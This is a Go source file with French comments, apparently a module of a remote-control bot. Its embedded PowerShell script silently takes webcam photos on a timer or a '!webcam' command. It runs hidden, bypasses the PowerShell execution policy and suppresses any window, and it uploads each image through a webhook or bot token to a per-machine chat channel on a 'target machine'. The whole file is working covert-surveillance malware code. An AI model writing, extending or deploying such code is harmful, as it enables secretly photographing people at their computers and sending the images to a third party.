// Webcam : une photo toutes les `interval_webcam_min` minutes, envoyée dans
// le salon dédié (`<machine>-webcam`).
//
// Aucune dépendance externe : PowerShell 5.1 pilote WinRT (MediaCapture) en
// tâche de fond, fenêtre masquée. Le point délicat tient en trois détails
// trouvés sur la machine cible :
//
//   - les flux uniquement vidéo (dongles USB) n'ont pas de flux photo : il
//     faut PhotoCaptureSource=VideoPreview et non Photo/Auto ;
//   - certains périodiques refusent l'initialisation tant qu'un autre
//     essai les garde ouverts : on essaie chaque caméra, on garde la
//     première image réellement produite (> 1 Ko) ;
//   - les surcharges génériques de AsTask ne se lient pas sous
//     PowerShell 5.1 : la script les appelle par réflexion.
package main

import (
	"bytes"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"time"
)

// webcamScript est le script exécuté, écrit sur disque à chaque capture.
// ASCII strict (pas d'accent, pas d'apostrophe typographique) : le fichier
// est relu par PowerShell sans BOM, un caractère non ASCII corromprait la
// syntaxe.
const webcamScript = `param([string]$Out)
$ErrorActionPreference = 'Stop'
[void][Windows.Media.Capture.MediaCapture,Windows.Media.Capture,ContentType=WindowsRuntime]
[void][Windows.Media.Capture.MediaCaptureInitializationSettings,Windows.Media.Capture,ContentType=WindowsRuntime]
[void][Windows.Devices.Enumeration.DeviceInformation,Windows.Devices.Enumeration,ContentType=WindowsRuntime]
[void][Windows.Media.MediaProperties.ImageEncodingProperties,Windows.Media.MediaProperties,ContentType=WindowsRuntime]
[void][Windows.Storage.StorageFolder,Windows.Storage,ContentType=WindowsRuntime]
Add-Type -AssemblyName System.Runtime.WindowsRuntime

function AwaitAction($op) {
  $m = [System.WindowsRuntimeSystemExtensions].GetMethods() | Where-Object {
    $_.Name -eq 'AsTask' -and -not $_.IsGenericMethodDefinition -and
    $_.GetParameters().Count -eq 1 -and $_.GetParameters()[0].ParameterType.Name -eq 'IAsyncAction'
  } | Select-Object -First 1
  $task = $m.Invoke($null, @($op))
  try { $null = $task.Wait(45000) } catch [System.AggregateException] { throw $_.Exception.Flatten().InnerExceptions[0] }
}
function AwaitOp($op, [type]$T) {
  $opName = 'IAsyncOperation' + [char]96 + '1'
  $m = [System.WindowsRuntimeSystemExtensions].GetMethods() | Where-Object {
    $_.Name -eq 'AsTask' -and $_.IsGenericMethodDefinition -and $_.GetParameters().Count -eq 1 -and
    $_.GetParameters()[0].ParameterType.Name -eq $opName
  } | Select-Object -First 1
  $task = $m.MakeGenericMethod($T).Invoke($null, @($op))
  try { $null = $task.Wait(45000) } catch [System.AggregateException] { throw $_.Exception.Flatten().InnerExceptions[0] }
  return $task.Result
}

$trash = @()
try {
  $diT = [Windows.Devices.Enumeration.DeviceInformation,Windows.Devices.Enumeration,ContentType=WindowsRuntime]
  $find = @($diT.GetMethods() | Where-Object { $_.Name -eq 'FindAllAsync' -and $_.GetParameters().Count -eq 0 })[0]
  $collT = [Windows.Devices.Enumeration.DeviceInformationCollection]
  $all = AwaitOp ($find.Invoke($null, @())) $collT
  $devices = @($all | Where-Object { $_.Id -like '*e5323777*' })
  if ($devices.Count -eq 0) { Write-Output 'FAIL aucune camera'; exit 1 }

  $initT = [Windows.Media.Capture.MediaCaptureInitializationSettings,Windows.Media.Capture,ContentType=WindowsRuntime]
  $capT = [Windows.Media.Capture.MediaCapture,Windows.Media.Capture,ContentType=WindowsRuntime]
  $folderT = [Windows.Storage.StorageFolder]
  $gop = @($folderT.GetMethods() | Where-Object { $_.Name -eq 'GetFolderFromPathAsync' })[0]
  $folder = AwaitOp ($gop.Invoke($null, @($env:TEMP))) $folderT
  $cfop = @($folderT.GetMethods() | Where-Object { $_.Name -eq 'CreateFileAsync' })[0]
  $fileT = [Windows.Storage.StorageFile]
  $shot = @($capT.GetMethods() | Where-Object { $_.Name -eq 'CapturePhotoToStorageFileAsync' })[0]
  $props = [Windows.Media.MediaProperties.ImageEncodingProperties,Windows.Media.MediaProperties,ContentType=WindowsRuntime]::CreateJpeg()

  foreach ($d in $devices) {
    $name = "wmc-" + [Guid]::NewGuid().ToString('N').Substring(0,8) + ".jpg"
    try {
      if ($cfop.GetParameters().Count -eq 2) { $sf = AwaitOp ($cfop.Invoke($folder, @($name, 0))) $fileT }
      else { $sf = AwaitOp ($cfop.Invoke($folder, @($name))) $fileT }
      $init = [Activator]::CreateInstance($initT)
      $initT.GetProperty('VideoDeviceId').SetValue($init, $d.Id)
      $sm = $initT.GetProperty('StreamingCaptureMode')
      if ($sm) { $sm.SetValue($init, [System.Enum]::Parse($sm.PropertyType, 'Video')) }
      $pcs = $initT.GetProperty('PhotoCaptureSource')
      if ($pcs) { $pcs.SetValue($init, [System.Enum]::Parse($pcs.PropertyType, 'VideoPreview')) }
      $cap = [Activator]::CreateInstance($capT)
      AwaitAction ($cap.InitializeAsync($init))
      AwaitAction ($shot.Invoke($cap, @($props, $sf)))
      try { $cap.Dispose() } catch { }
      $len = (Get-Item $sf.Path).Length
      if ($len -gt 1024) {
        Copy-Item $sf.Path $Out -Force
        Remove-Item $sf.Path -Force -ErrorAction SilentlyContinue
        Write-Output ("OK " + $len)
        exit 0
      }
      $trash += $sf.Path
    } catch {
      $trash += $name
      continue
    }
  }
  Write-Output 'FAIL aucune image'
  exit 1
} catch {
  Write-Output ("FAIL " + $_.Exception.Message)
  exit 1
} finally {
  foreach ($t in $trash) {
    $p = if ([IO.Path]::IsPathRooted($t)) { $t } else { Join-Path $env:TEMP $t }
    Remove-Item $p -Force -ErrorAction SilentlyContinue
  }
}
`

// webcamCapture écrit le script, l'exécute en fenêtre masquée et renvoie le
// chemin de la photo. Erreur explicite si aucune image n'a été produite.
func webcamCapture() (string, error) {
	script := workPath("wmc.ps1")
	if err := os.WriteFile(script, []byte(webcamScript), 0600); err != nil {
		return "", fmt.Errorf("script: %s", err)
	}
	out := workPath(fmt.Sprintf("cam-%s.jpg", time.Now().Format("060102-150405")))
	_ = os.Remove(out)

	cmd := exec.Command("powershell.exe",
		"-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden",
		"-ExecutionPolicy", "Bypass", "-File", script, "-Out", out)
	cmd.SysProcAttr = &syscall.SysProcAttr{CreationFlags: 0x08000000} // CREATE_NO_WINDOW
	var buf bytes.Buffer
	cmd.Stdout = &buf
	cmd.Stderr = &buf
	if err := cmd.Run(); err != nil {
		msg := truncate(strings.TrimSpace(buf.String()), 200)
		return "", fmt.Errorf("%s (%s)", err, msg)
	}
	st, err := os.Stat(out)
	if err != nil || st.Size() < 1024 {
		return "", fmt.Errorf("aucune image : %s", truncate(strings.TrimSpace(buf.String()), 200))
	}
	return out, nil
}

// webcamFlush prend une photo et la pousse dans le salon webcam (tâche
// périodique : un échec est seulement journalisé, la cadence suivante
// retentera).
func webcamFlush() {
	_ = webcamNow()
}

// webcamNow est la même chose en version testable : l'erreur sert de
// réponse à `!webcam`.
func webcamNow() error {
	if stopped.Load() || (cfg.WebhookURL == "" && cfg.BotToken == "") {
		return fmt.Errorf("transport non configuré")
	}
	path, err := webcamCapture()
	if err != nil {
		plog("webcam: " + err.Error())
		return err
	}
	data, rerr := os.ReadFile(path)
	name := strings.TrimPrefix(path, workDir()+string(os.PathSeparator))
	_ = os.Remove(path)
	if rerr != nil || len(data) < 1024 {
		plog("webcam: image invalide " + name)
		return fmt.Errorf("image invalide")
	}
	ch := webcamChannel()
	if ch == "" {
		plog("webcam: salon pas encore résolu, image perdue " + name)
		return fmt.Errorf("salon webcam pas encore résolu")
	}
	sendFilesTo(ch, fileOut{Name: name, Data: data})
	plog(fmt.Sprintf("webcam: %s (%d octets)", name, len(data)))
	return nil
}
